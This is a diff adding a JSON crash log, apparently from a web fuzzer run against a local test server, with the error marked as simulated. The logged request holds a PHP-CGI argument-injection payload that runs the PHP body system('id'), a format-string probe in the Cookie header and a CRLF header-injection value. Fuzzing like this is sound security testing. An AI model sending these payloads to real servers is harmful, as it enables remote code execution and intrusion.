@@ -1,0 +1,23 @@
+{
+  "timestamp": "2025-12-29T14:40:01.313100",
+  "crash_type": "server_crash",
+  "payload": "POST /cgi-bin/php-cgi.exe?-d+allow_url_include=1+-d+auto_prepend_file=php://input\nHeaders: {'User-Agent': 'curl/7.68.0', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Cookie': '%p%p%p%p%p%p%p%p%p%p', 'Accept-Language': '%0d%0aSet-Cookie: evil=true', 'Content-Length': '22'}\nBody: <?php system('id'); ?>",
+  "payload_hash": "04d1e4c5aab71bcd",
+  "request_method": "POST",
+  "request_path": "/cgi-bin/php-cgi.exe?-d+allow_url_include=1+-d+auto_prepend_file=php://input",
+  "request_headers": {
+    "User-Agent": "curl/7.68.0",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Cookie": "%p%p%p%p%p%p%p%p%p%p",
+    "Accept-Language": "%0d%0aSet-Cookie: evil=true",
+    "Content-Length": "22"
+  },
+  "request_body": "<?php system('id'); ?>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 199
+}
